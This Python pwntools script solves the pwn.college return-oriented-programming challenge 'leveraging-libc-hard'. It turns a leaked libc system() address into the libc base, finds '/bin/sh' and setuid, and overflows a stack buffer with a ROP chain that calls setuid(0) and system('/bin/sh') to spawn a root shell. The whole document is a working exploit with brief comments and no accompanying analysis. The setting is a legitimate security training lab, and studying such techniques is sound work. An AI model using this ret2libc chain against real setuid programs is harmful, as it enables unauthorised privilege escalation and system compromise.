#!/usr/bin/env python3
# pwn.college/program-security/return-oriented-programming/
# Challenge: leveraging-libc-hard

from pwn import *

# Set context
context.arch = "amd64"

# Start the challenge process
io = process("/challenge/leveraging-libc-hard")

# Receive the leaked system address
io.recvuntil(b'The address of "system" in libc is: ')
leak = io.recvline().strip().decode()
# Remove the trailing period if present
leak = leak.rstrip(".")
system_addr = int(leak, 16)
log.info(f"Leaked system address: {hex(system_addr)}")

# Calculate libc base address
# We need to find the offset of system in libc
# For typical libc, we can calculate the offset to "/bin/sh" string
# Common offsets (may need adjustment based on libc version):
# system offset in libc is usually around 0x50d60 or similar
# /bin/sh offset in libc is usually around 0x1d8698 or similar

# We'll use a common technique: calculate libc base from system
# Then find /bin/sh string in libc
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = system_addr - libc.symbols["system"]
log.info(f"Libc base address: {hex(libc.address)}")

# Find /bin/sh string in libc
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"/bin/sh address: {hex(binsh_addr)}")

# Get setuid address from libc
setuid_addr = libc.symbols["setuid"]
log.info(f"setuid address: {hex(setuid_addr)}")

# ROP gadgets from the binary
pop_rdi = 0x4013F3  # pop rdi; ret
ret = 0x40101A  # ret (for stack alignment)

# Calculate buffer overflow offset
# From the disassembly: buffer is at -0x90(%rbp)
# Stack layout: buffer (0x90 bytes) + saved rbp (8 bytes) + return address (8 bytes)
offset = 0x90 + 8

# Build the payload
payload = b"A" * offset

# ROP chain to call setuid(0) then system("/bin/sh")
# First call setuid(0) to maintain root privileges
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(0)  # uid = 0 (root)
payload += p64(ret)  # Stack alignment for setuid
payload += p64(setuid_addr)  # setuid(0)

# Then call system("/bin/sh")
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(binsh_addr)  # "/bin/sh" address
payload += p64(ret)  # Stack alignment for system
payload += p64(system_addr)  # system("/bin/sh")

# Send the payload
log.info(f"Sending payload of length {len(payload)}")
io.send(payload)

# Get the flag
io.interactive()
